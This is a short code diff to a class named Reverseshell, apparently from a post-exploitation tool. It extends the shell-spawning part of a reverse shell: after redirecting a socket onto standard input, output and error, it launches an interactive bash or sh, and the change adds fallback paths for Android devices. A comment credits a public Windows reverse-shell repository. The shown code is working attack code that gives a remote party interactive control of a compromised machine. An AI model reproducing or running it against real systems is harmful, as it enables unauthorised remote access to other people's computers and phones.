@@ -77,8 +77,13 @@ class Reverseshell(Module):
 			dup2(s.fileno(),2) 
 			if exists('/bin/bash'):
 				run(["/bin/bash","-i"])
-			else:
+			elif exists('/bin/sh'):
 				run(["/bin/sh","-i"])
+			## Maybe Android ?
+			elif exists('/system/bin/bash'):
+				run(["/system/bin/bash","-i"])
+			elif exists('/system/bin/sh'):
+				run(["/system/bin/sh","-i"])
 		elif platform_name == 'Windows':
 			## Taken from https://github.com/TacticalCheerio/Python-Windows-Reverse-Shell with a few modifications
 			import os
